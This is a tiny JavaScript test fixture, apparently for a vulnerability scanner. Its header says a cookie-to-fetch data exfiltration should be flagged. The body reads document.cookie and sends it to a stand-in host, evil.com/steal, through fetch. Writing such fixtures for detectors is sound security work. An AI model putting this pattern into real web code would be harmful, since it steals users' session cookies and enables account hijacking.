/**
 * Test: Data exfiltration via fetch URL
 * Expected: VULNERABILITY - cookie to fetch
 */

function test() {
  var token = document.cookie;
  fetch('https://evil.com/steal?data=' + token);
}

test();
